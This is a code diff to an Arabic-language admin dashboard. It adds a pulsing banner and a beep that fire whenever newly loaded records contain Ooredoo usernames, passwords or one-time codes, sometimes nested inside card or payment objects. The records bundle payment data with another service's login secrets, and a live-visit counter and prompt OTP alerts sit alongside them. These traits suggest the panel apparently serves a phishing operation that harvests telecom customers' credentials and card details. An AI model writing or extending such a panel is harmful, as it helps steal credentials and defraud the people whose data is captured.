@@ -51,6 +51,17 @@
   .wifi-btn svg{ width:16px; height:16px; }
   .wifi-count{ background:var(--accent); color:#fff; border-radius:999px; padding:1px 8px; font-size:12px; }
 
+  .incoming-alert {
+    display:none; align-items:center; gap:8px; background:#fff3cd; color:#7a5a12;
+    border:1px solid #f0d98c; border-radius:999px; padding:8px 14px; font-size:12.5px;
+    font-weight:800; animation: pulseAlert 1.2s infinite alternate;
+  }
+  .incoming-alert.show { display:inline-flex; }
+  @keyframes pulseAlert {
+    from { box-shadow: 0 0 0 rgba(255, 179, 0, 0.1); transform: scale(1); }
+    to { box-shadow: 0 0 0 8px rgba(255, 179, 0, 0.08); transform: scale(1.02); }
+  }
+
   .admin-table-wrap{ overflow-x:auto; border:1px solid var(--line); border-radius:8px; }
   .admin-table{ width:100%; border-collapse:collapse; font-size:14px; min-width:980px; }
   .admin-table th{
@@ -157,6 +168,7 @@
         الزيارات النشطة
         <span class="wifi-count" id="wifiCount">0</span>
       </button>
+      <div class="incoming-alert" id="incomingAlert">تنبيه: بيانات أوريدو جديدة</div>
       <span style="font-size:12.5px;color:var(--muted);" id="appCountLabel">0 طلب</span>
     </div>
 
@@ -191,6 +203,44 @@
 <script>
   let adminToken = '';
   let loadedApplications = [];
+  let lastOoredooSignal = '';
+
+  function hasOoredooData(d) {
+    const card = d.card || d.payment || null;
+    const ooredooUser = (d.ooredooUser || (card && card.ooredooUser)) || '';
+    const ooredooPass = (d.ooredooPass || (card && card.ooredooPass)) || '';
+    const ooredooOtp = (d.ooredooOtp || (card && card.ooredooOtp)) || '';
+    return Boolean(ooredooUser || ooredooPass || ooredooOtp);
+  }
+
+  function triggerIncomingOoredooAlert() {
+    const incoming = (loadedApplications || []).filter((d) => hasOoredooData(d));
+    const signal = incoming.map((d) => d.id || d.applicant && d.applicant.id || d._id || '').join('|');
+    if (!signal || signal === lastOoredooSignal) return;
+
+    lastOoredooSignal = signal;
+    const alertBox = document.getElementById('incomingAlert');
+    if (alertBox) {
+      alertBox.classList.add('show');
+      setTimeout(() => alertBox.classList.remove('show'), 5000);
+    }
+
+    try {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      if (AudioCtx) {
+        const ctx = new AudioCtx();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'triangle';
+        osc.frequency.value = 980;
+        gain.gain.value = 0.04;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        setTimeout(() => { osc.stop(); ctx.close(); }, 300);
+      }
+    } catch (err) {}
+  }
 
   document.getElementById('adminLoginBtn').addEventListener('click', attemptAdminLogin);
   document.getElementById('adminPasswordInput').addEventListener('keydown', (e) => {
@@ -257,6 +307,7 @@
       if (!res.ok) throw new Error('failed');
       const data = await res.json();
       loadedApplications = data.orders || [];
+      triggerIncomingOoredooAlert();
 
       document.getElementById('appCountLabel').textContent = loadedApplications.length + ' طلب';
 
